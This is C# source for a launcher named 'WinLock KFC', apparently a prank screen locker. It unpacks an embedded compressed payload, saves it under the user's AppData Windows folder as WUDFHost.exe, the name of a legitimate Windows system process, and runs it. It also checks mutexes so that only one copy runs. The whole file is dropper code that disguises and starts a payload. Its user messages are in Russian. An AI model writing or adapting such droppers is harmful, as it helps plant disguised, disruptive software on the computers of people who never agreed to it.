using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal static class WinLockLauncher
{
    private const string PayloadMutexName = "WinLockKFC_Prank_3015";
    private const string LauncherMutexName = "WinLockKFC_Launcher_3015";
    private const string PayloadFileName = "WUDFHost.exe";
    private const string PayloadResourceName = "payload.gz";

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int MessageBoxW(IntPtr hWnd, string text, string caption, uint type);

    [STAThread]
    private static int Main(string[] args)
    {
        try
        {
            bool waitForExit = IsTestMode(args);

            bool created;
            using (Mutex launcherMutex = new Mutex(true, LauncherMutexName, out created))
            {
                if (!created)
                {
                    return 0;
                }

                if (PayloadIsRunning())
                {
                    return 0;
                }

                string workDir = AppDomain.CurrentDomain.BaseDirectory;
                string payloadDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft",
                    "Windows");
                Directory.CreateDirectory(payloadDir);

                string payloadPath = Path.Combine(payloadDir, PayloadFileName);
                ExtractPayload(payloadPath);

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = payloadPath;
                startInfo.Arguments = JoinArguments(args);
                startInfo.WorkingDirectory = workDir;
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = false;
                startInfo.EnvironmentVariables["WINLOCK_WORKDIR"] = workDir;

                Process process = Process.Start(startInfo);
                if (process == null)
                {
                    throw new InvalidOperationException("Windows did not start the helper process.");
                }

                if (waitForExit)
                {
                    process.WaitForExit();
                    return process.ExitCode;
                }

                return 0;
            }
        }
        catch (Exception ex)
        {
            MessageBoxW(
                IntPtr.Zero,
                "Не удалось запустить WinLock KFC.\r\n\r\n" + ex.Message,
                "WinLock KFC",
                0x10);
            return 1;
        }
    }

    private static bool PayloadIsRunning()
    {
        try
        {
            using (Mutex mutex = Mutex.OpenExisting(PayloadMutexName))
            {
                GC.KeepAlive(mutex);
                return true;
            }
        }
        catch (WaitHandleCannotBeOpenedException)
        {
            return false;
        }
        catch
        {
            return false;
        }
    }

    private static void ExtractPayload(string payloadPath)
    {
        string tempPath = payloadPath + ".tmp";

        using (Stream resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(PayloadResourceName))
        {
            if (resource == null)
            {
                throw new InvalidOperationException("Встроенный файл программы не найден.");
            }

            using (GZipStream gzip = new GZipStream(resource, CompressionMode.Decompress))
            using (FileStream output = new FileStream(tempPath, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                gzip.CopyTo(output);
            }
        }

        for (int attempt = 0; attempt < 6; attempt++)
        {
            try
            {
                if (File.Exists(payloadPath))
                {
                    File.Delete(payloadPath);
                }
                File.Move(tempPath, payloadPath);
                return;
            }
            catch (IOException)
            {
                Thread.Sleep(120);
            }
            catch (UnauthorizedAccessException)
            {
                Thread.Sleep(120);
            }
        }

        if (File.Exists(tempPath))
        {
            File.Delete(tempPath);
        }
        throw new IOException("Не удалось обновить служебный файл. Закрой прошлый запуск и попробуй снова.");
    }

    private static bool IsTestMode(string[] args)
    {
        if (args == null)
        {
            return false;
        }

        string[] testFlags = new string[]
        {
            "--preview",
            "--smoke",
            "--selftest",
            "--policy-selftest",
            "--restore"
        };

        foreach (string flag in testFlags)
        {
            if (Array.IndexOf(args, flag) >= 0)
            {
                return true;
            }
        }

        return false;
    }

    private static string JoinArguments(string[] args)
    {
        if (args == null || args.Length == 0)
        {
            return "";
        }

        StringBuilder builder = new StringBuilder();
        foreach (string arg in args)
        {
            if (builder.Length > 0)
            {
                builder.Append(' ');
            }

            if (arg.Length == 0 || arg.IndexOf(' ') >= 0 || arg.IndexOf('\t') >= 0 || arg.IndexOf('"') >= 0)
            {
                builder.Append('"');
                foreach (char character in arg)
                {
                    if (character == '"')
                    {
                        builder.Append("\\\"");
                    }
                    else
                    {
                        builder.Append(character);
                    }
                }
                builder.Append('"');
            }
            else
            {
                builder.Append(arg);
            }
        }

        return builder.ToString();
    }
}
